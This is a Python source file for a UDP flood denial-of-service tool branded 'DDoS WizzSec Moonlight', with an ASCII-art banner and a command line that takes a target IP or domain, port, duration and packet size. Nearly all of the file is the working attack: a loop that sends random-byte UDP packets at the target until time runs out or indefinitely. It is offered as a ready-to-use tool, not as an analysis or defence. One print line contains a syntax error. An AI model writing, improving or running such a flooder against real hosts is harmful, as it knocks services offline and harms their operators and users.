# -*- coding: utf-8 -*-
from time import time as tt
import argparse
import socket
import random
import os
from colorama import Fore

ui = """
                                         _.oo.
                 _.u[[/;:,.         .odMMMMMM'
              .o888UU[[[/;:-.  .o@P^    MMM^
             oN88888UU[[[/;::-.        dP^
            dNMMNN888UU[[[/;:--.   .o@P^
           ,MMMMMMN888UU[[/;::-. o@^
           NNMMMNN888UU[[[/~.o@P^
           888888888UU[[[/o@^-..
          oI8888UU[[[/o@P^:--..
       .@^  YUU[[[/o@^;::---..
     oMP     ^/o@P^;:::---..
  .dMMM    .o@^ ^;::---...
 dMMMMMMM@^`       `^^^^
YMMMUP^
            DDoS WizzSec Moonlight
                   V : 1.0G1
              MADE BY : Wizzly
             TEAM  : Relax Sec
"""

os.system("clear")
def attack(ip, port, time, size):

    if time is None:
        time = float('inf')

    if port is not None:
        port = max(1, min(65535, port))
    print(Fore.LIGHTMAGENTA_EX + ui)
    print(Fore.LIGHTMAGENTA_EX"Attacked By WizzSec")
    fmt = Fore.LIGHTMAGENTA_EX+'OBFCUTE ATTACK TO {ip} {port}'.format(
        ip=ip,
        port='port {port}'.format(port=port) if port else 'random ports'
    )
    print(fmt)

    startup = tt()
    size = os.urandom(min(666, size))
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    while True:
        port = port or random.randint(1, 65535)

        endtime = tt()
        if (startup + time) < endtime:
            break

        sock.sendto(size, (ip, port))

    print(Fore.LIGHTMAGENTA_EX+'Attack Finished')

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Usage: python3 moon.py <ip> <port> <time> <size>')

    parser.add_argument('ip', type=str, help='IP or domain to attack.')
    parser.add_argument('-p', '--port', type=int, default=None, help='Port number.')
    parser.add_argument('-t', '--time', type=int, default=None, help='Time in seconds.')
    parser.add_argument('-s', '--size', type=int, default=666, help='Size in bytes.')

    args = parser.parse_args()

    try:
        attack(args.ip, args.port, args.time, args.size)
    except KeyboardInterrupt:
        print('Attack stopped.')